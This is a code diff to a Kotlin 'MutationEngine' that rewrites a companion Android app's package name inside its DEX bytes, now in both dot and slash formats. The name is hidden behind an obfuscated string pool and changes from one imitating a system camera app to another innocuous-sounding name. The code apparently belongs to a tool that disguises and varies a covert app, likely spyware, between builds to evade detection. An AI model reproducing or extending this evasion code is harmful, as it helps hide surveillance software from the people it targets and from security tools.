@@ -209,28 +209,38 @@ class MutationEngine(private val context: Context) {
     // ── M1: Package name patching ─────────────────────────────────────────────
     // Safe: replaces exact same-length byte sequences inside DEX.
     // Does NOT touch ZIP structure, EOCD, or any signed metadata.
+    // Patches BOTH dot-format (manifest/strings) and slash-format (DEX class descriptors).
 
     private fun patchPackageName(bytes: ByteArray, newPkg: String): ByteArray {
-        val oldPkg   = StringPool.d(StringPool.COMPANION_OLD_PKG)
-        val oldBytes = oldPkg.toByteArray(Charsets.UTF_8)
-        val newBytes = newPkg.toByteArray(Charsets.UTF_8)
+        val oldPkg = StringPool.d(StringPool.COMPANION_OLD_PKG)
 
-        // Only patch when lengths match — guaranteed by package_name_generator.py
-        // which generates same-length packages. If mismatch, return unchanged.
-        if (oldBytes.size != newBytes.size) return bytes
+        // Patch dot-format: com.android.photo.camera.capture → com.backgroundboots.synchandlers
+        // Patch slash-format: com/android/photo/camera/capture → com/backgroundboots/synchandlers
+        val targets = listOf(
+            oldPkg                    to newPkg,
+            oldPkg.replace('.', '/') to newPkg.replace('.', '/')
+        )
 
-        val result = bytes.copyOf()
-        var i = 0
-        while (i <= result.size - oldBytes.size) {
-            var match = true
-            for (j in oldBytes.indices) {
-                if (result[i + j] != oldBytes[j]) { match = false; break }
-            }
-            if (match) {
-                for (j in newBytes.indices) result[i + j] = newBytes[j]
-                i += oldBytes.size
-            } else {
-                i++
+        var result = bytes.copyOf()
+        for ((oldStr, newStr) in targets) {
+            val oldBytes = oldStr.toByteArray(Charsets.UTF_8)
+            val newBytes = newStr.toByteArray(Charsets.UTF_8)
+
+            // Only patch when lengths match — guaranteed by package_name_generator.py
+            if (oldBytes.size != newBytes.size) continue
+
+            var i = 0
+            while (i <= result.size - oldBytes.size) {
+                var match = true
+                for (j in oldBytes.indices) {
+                    if (result[i + j] != oldBytes[j]) { match = false; break }
+                }
+                if (match) {
+                    for (j in newBytes.indices) result[i + j] = newBytes[j]
+                    i += oldBytes.size
+                } else {
+                    i++
+                }
             }
         }
         return result
